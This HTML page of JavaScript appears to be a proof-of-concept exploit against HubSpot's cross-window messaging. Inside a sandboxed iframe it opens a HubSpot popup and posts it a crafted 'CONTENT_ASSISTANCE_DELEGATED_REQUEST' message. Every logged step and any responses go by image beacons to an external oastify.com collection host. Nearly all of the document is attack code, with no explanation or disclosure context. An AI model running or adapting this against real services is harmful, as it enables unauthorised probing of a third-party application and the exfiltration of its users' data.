<!DOCTYPE html>
<html>
<head>
    <title>Loading...</title>
</head>
<body>
    <h1>Relay Page Loaded</h1>
    <div id="status">Waiting for instructions...</div>

<script>
const EXFIL = 'https://sb7vo63by517nq7kyd6fe03t8keb2aqz.oastify.com';

function log(msg) {
    document.getElementById('status').innerHTML += '<br>' + msg;
    new Image().src = EXFIL + '/?log=' + encodeURIComponent(msg);
}

log('relay_page_loaded');

// Listen for instructions from opener
window.addEventListener('message', function(e) {
    log('got_message_from: ' + e.origin);
    log('message_data: ' + JSON.stringify(e.data));
    
    if (e.data.action === 'startExploit') {
        log('starting_exploit');
        
        // Create sandboxed iframe
        const sandbox = document.createElement('iframe');
        sandbox.sandbox = 'allow-scripts allow-popups allow-same-origin';
        sandbox.style.width = '100%';
        sandbox.style.height = '400px';
        sandbox.style.border = '2px solid red';
        
        sandbox.srcdoc = `
            <h2>Sandbox Created</h2>
            <div id="log"></div>
            <script>
                const EXFIL = 'https://sb7vo63by517nq7kyd6fe03t8keb2aqz.oastify.com';
                
                function log(msg) {
                    document.getElementById('log').innerHTML += '<br>' + msg;
                    new Image().src = EXFIL + '/?sandbox=' + encodeURIComponent(msg);
                }
                
                log('sandbox_script_running');
                log('window_origin: ' + window.origin);
                
                // Open HubSpot
                log('attempting_to_open_hubspot');
                let hub = window.open('https://app-eu1.hubspot.com', 'hubspot', 'width=800,height=600');
                
                if (!hub) {
                    log('ERROR: popup_blocked');
                } else {
                    log('SUCCESS: popup_opened');
                    log('popup_origin: ' + hub.origin);
                    
                    // Poll until loaded
                    let attempts = 0;
                    let checker = setInterval(() => {
                        attempts++;
                        
                        try {
                            let test = hub.origin;
                            if (attempts % 10 === 0) {
                                log('still_loading_attempt_' + attempts);
                            }
                        } catch(e) {
                            clearInterval(checker);
                            log('LOADED after ' + attempts + ' attempts');
                            log('error_message: ' + e.message);
                            
                            // Listen for responses
                            window.addEventListener('message', function(resp) {
                                log('GOT_RESPONSE from: ' + resp.origin);
                                new Image().src = EXFIL + '/?response=' + encodeURIComponent(JSON.stringify(resp.data).substring(0, 200));
                            });
                            
                            // Send exploit
                            setTimeout(() => {
                                log('sending_postMessage_to_hubspot');
                                hub.postMessage({
                                    type: 'CONTENT_ASSISTANCE_DELEGATED_REQUEST',
                                    commandId: 'test123',
                                    featureId: 'test',
                                    parameters: {},
                                    resultCount: 1,
                                    language: 'en',
                                    objectId: '1',
                                    applicationId: 'test',
                                    basePath: '/',
                                    maxPollingAttempts: 1,
                                    pollingInterval: 100
                                }, '*');
                                log('postMessage_sent');
                            }, 1000);
                        }
                        
                        if (attempts > 100) {
                            clearInterval(checker);
                            log('TIMEOUT after 100 attempts');
                        }
                    }, 100);
                }
            </scr\ipt>
        `;
        
        document.body.appendChild(sandbox);
        log('sandbox_iframe_added_to_page');
    }
});

// Notify opener
if (window.opener) {
    log('has_opener_sending_ready_message');
    window.opener.postMessage({status: 'relay ready'}, '*');
} else {
    log('NO_OPENER_FOUND');
}
</script>
</body>
</html>
